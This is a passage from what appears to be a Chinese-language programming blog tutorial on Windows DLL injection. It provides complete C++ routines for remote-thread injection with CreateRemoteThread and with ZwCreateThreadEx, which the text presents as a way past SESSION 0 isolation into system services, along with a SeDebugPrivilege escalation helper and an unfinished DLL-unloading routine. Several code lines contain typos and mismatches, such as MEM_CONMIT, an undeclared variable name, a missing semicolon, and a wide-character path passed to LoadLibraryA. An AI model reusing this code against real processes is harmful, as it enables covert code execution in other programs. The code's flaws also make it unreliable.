class="headerlink" title="CreateRemoteThread 函数"></a>CreateRemoteThread 函数</h3><blockquote><p>在另一个进程的虚拟地址空间中创建运行的线程</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>CreateRemoteThread</strong></p><ul><li><code>hProcess</code>: 要创建线程的进程句柄。句柄必须具有<code>PROCESS_CREATE_THREAD</code>、<code>PROCESS_QUERY_INFORMATION</code>、<code>PROCESS_VM_OPERATION</code>、<code>PROCESS_VM_WRITE</code>和<code>PEOCESS_VM_READ</code>访问权限</li><li><code>lpThreadAttributes</code>: 指向<code>SECURITY_ATTRIBUTES</code>结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果<code>lpThreadAttributes</code>为NULL，则线程将获得默认的安全描述符，并且不能继承该句柄</li><li><code>dwStackSize</code>: 堆栈的初始化大小，以字节为单位。如果此参数为0，则新线程使用可执行文件的默认大小</li><li><code>lpStartAddress</code>: 指向由线程执行类型为<code>LPTHREAD_START_ROUTINE</code>的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中</li><li><code>lpParameter</code>: 指向要传递给线程函数的变量指针</li><li><code>dwCreationFlags</code>: 控制线程创建的标志，若是0，则表示线程在创建后立即执行</li><li><code>lpThreadId</code>: 指向接收线程标识符的变量指针。如果此参数为NULL，则不返回线程标识符</li></ul><hr><p>如果函数成功，则返回值是新线程的句柄<br>如果函数失败，则返回值为NULL</p></div><h3 id="远程线程注入代码实现"><a href="#远程线程注入代码实现" class="headerlink" title="远程线程注入代码实现"></a>远程线程注入代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Inject</span><span class="params">(DWORD dwPid, <span class="type">const</span> WCHAR* szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开进程</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">    <span class="comment">// 申请内存</span></span><br><span class="line">    LPVOID lpAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_CONMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpAddress == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把动态链接库写入到目标内存中</span></span><br><span class="line">    SIZE_T szWriteLength = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpAddress, szPath, ((<span class="built_in">wcslen</span>(szPath) + <span class="number">1</span>) * <span class="number">2</span>), &amp;szWrithLength);</span><br><span class="line">    <span class="comment">// 创建远程线程，把LoadLibrary作为回调函数，并且把刚才的地址作为参数进行调用</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 等待线程执行结束</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">    <span class="comment">// 清理、释放空间</span></span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ZwCreateThreadEx-突破-SESSION-0-隔离的远程线程注入"><a href="#ZwCreateThreadEx-突破-SESSION-0-隔离的远程线程注入" class="headerlink" title="ZwCreateThreadEx 突破 SESSION 0 隔离的远程线程注入"></a>ZwCreateThreadEx 突破 SESSION 0 隔离的远程线程注入</h2><blockquote><p>与传统的<code>CreateRemoteThread</code>函数实现的远程线程注入DLL的唯一区别在于，突破<code>SESSION 0</code>远程线程注入是使用比<code>CreateRemoteThred</code>函数更为底层的<code>ZwCreateThreadEx</code>函数来创建远程线程。<code>ZwCreateThreadEx</code>函数可以突破<code>SESSION 0</code>隔离，将DLL成功注入到<code>SESSION 0</code>隔离的系统服务进程中。其中<code>ZwCreateThreadEx</code>在<code>ntdll.dll</code>中并没有声明，所以需要使用<code>GetProcAddress</code>从<code>ntdll.dll</code>中获取该函数的导出地址</p></blockquote><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><p><strong>64位系统下函数声明</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ZwCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><p><strong>32位系统下函数声明</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ZwCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><h3 id="ZwCreateThreadEx-注入代码实现"><a href="#ZwCreateThreadEx-注入代码实现" class="headerlink" title="ZwCreateThreadEx 注入代码实现"></a>ZwCreateThreadEx 注入代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ZwCreateThreadExInjectDll</span><span class="params">(DWORD dwPid, <span class="type">char</span>* szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开进程句柄</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">    <span class="keyword">if</span>(hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在目标进程申请内存</span></span><br><span class="line">    DWORD dwSize = <span class="number">1</span> + <span class="built_in">lstrlen</span>(szDllPath);</span><br><span class="line">    LPVOID lpDllAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="comment">// 将数据写入目标进程</span></span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteProcessMemory</span>(hProcess, lpDllAddress, szDllPath, dwSize, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">        SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">        SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">        BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 获取ntdll.dll</span></span><br><span class="line">    HMODULE hNtDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(hNtDll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Load ntdll Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取LoadLibrary地址</span></span><br><span class="line">    FARPROC pFuncProcAddr = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(pFuncProcAddr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Get LoadLibrary Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取ZwCreateThreadEx地址</span></span><br><span class="line">    typedef_ZwCreateThreadEx zwCreateThreadEx = (typedef_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    HANDLE hRemoteThread = <span class="number">0</span>;</span><br><span class="line">    DWORD dwZwCreateThreadEx = <span class="built_in">zwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, lpDllAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(hRemoteThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;zwCreateThreadEx Failed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 关闭句柄</span></span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, lpDllAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// OpenProcess打开高权限的进程需要提权</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnablePrivileges</span><span class="params">(HANDLE hProcess, <span class="type">const</span> <span class="type">char</span>* pszPrivilegesName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">    LUID luidValue = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 打开进程令牌并获取进程令牌句柄</span></span><br><span class="line">    bRet = ::<span class="built_in">OpenProcessToken</span>(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取本地系统的 pszPrivilegesName 特权的LUID值</span></span><br><span class="line">    bRet = ::<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, pszPrivilegesName, &amp;luidValue);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置提升权限信息</span></span><br><span class="line">    tokenPrivileges.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tokenPrivileges.Privileges[<span class="number">0</span>].Luid = luidValue;</span><br><span class="line">    tokenPrivileges.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="comment">// 提升进程令牌访问权限</span></span><br><span class="line">    bRet = ::<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tokenPrivileges, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 根据错误码判断是否特权都设置成功</span></span><br><span class="line">        dwRet = ::<span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">if</span> (ERROR_SUCCESS == dwRet) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;SUCCESS!!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ERROR_NOT_ALL_ASSIGNED == dwRet) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR_NOT_ALL_ASSIGNED&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    <span class="built_in">EnablePrivileges</span>(hProcess, SE_DEBUG_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* szDllPath = <span class="string">&quot;C:\\Users\\dell\\OneDrive\\桌面\\Dll1.dll&quot;</span>;</span><br><span class="line">    <span class="built_in">ZwCreateThreadExInjectDll</span>(<span class="number">1364</span>, szDllPath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="卸载被注入的DLL文件"><a href="#卸载被注入的DLL文件" class="headerlink" title="卸载被注入的DLL文件"></a>卸载被注入的DLL文件</h2><h3 id="FreeLibrary-函数"><a href="#FreeLibrary-函数" class="headerlink" title="FreeLibrary 函数"></a>FreeLibrary 函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">FreeLibrary</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HMODULE hLibModule     <span class="comment">// dll 模块句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>FreeLibrary</strong></p><ul><li><code>FreeLibrary</code>函数使用的模块句柄可以通过前面介绍的<code>Module32First</code>和<code>Module32Next</code>两个函数获取，需要用到<code>MODULEENTRY32</code>结构体</li></ul></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagMODULEENTRY32</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD   dwSize;</span><br><span class="line">    DWORD   th32ModuleID;       <span class="comment">// This module</span></span><br><span class="line">    DWORD   th32ProcessID;      <span class="comment">// owning process</span></span><br><span class="line">    DWORD   GlblcntUsage;       <span class="comment">// Global usage count on the module</span></span><br><span class="line">    DWORD   ProccntUsage;       <span class="comment">// Module usage count in th32ProcessID&#x27;s context</span></span><br><span class="line">    BYTE  * modBaseAddr;        <span class="comment">// Base address of module in th32ProcessID&#x27;s context</span></span><br><span class="line">    DWORD   modBaseSize;        <span class="comment">// Size in bytes of module starting at modBaseAddr</span></span><br><span class="line">    HMODULE hModule;            <span class="comment">// The hModule of this module in th32ProcessID&#x27;s context</span></span><br><span class="line">    <span class="type">char</span>    szModule[MAX_MODULE_NAME32 + <span class="number">1</span>];</span><br><span class="line">    <span class="type">char</span>    szExePath[MAX_PATH];</span><br><span class="line">&#125; MODULEENTRY32;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>MODULEENTRY32</strong></p><ul><li><code>hModule</code>: 模块句柄</li><li><code>szModule</code>: 模块名称</li><li><code>szExePath</code>: 完整的模块的路径（包括路径和模块名称）</li></ul></div><h3 id="卸载DLL文件代码实现"><a href="#卸载DLL文件代码实现" class="headerlink" title="卸载DLL文件代码实现"></a>卸载DLL文件代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">UnInjectDll</span><span class="params">(DWORD dwPid, <span class="type">char</span>* szDllName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dwPid == <span class="number">0</span> || <span class="built_in">lstrlen</span>(szDllName) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 拍摄进程快照，需要包含TlHelp32.h头文件</span></span><br><span class="line">    HANDLE hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SANPMODULE, dwPid)</span><br><span class="line">    MODULEENTRY32 me32;</span><br><span class="line">    me32.dwSize = <span class="built_in">sizeof</span>(me32);</span><br><span class="line">    <span class="comment">// 查找匹配的模块名</span></span><br><span class="line">    BOOL bRet = <span class="built_in">Module32First</span>(hSnap, &amp;me32);</span><br><span class="line">    <span class="keyword">while</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">lstrcmp</span>(<span class="built_in">strupr</span>(me32.szExePath), <span class="built_in">strupr</span>(szDllName)) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet = <span class="built_in">Module32Next</span>(hSnap, &amp;me32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnap);</span><br><span class="line">    <span class="comment">// 打开进程</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">    <span class="comment">// 获取FreeLibrary函数地址</span></span><br><span class="line">    FARPROC pFuncProcAddr = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span 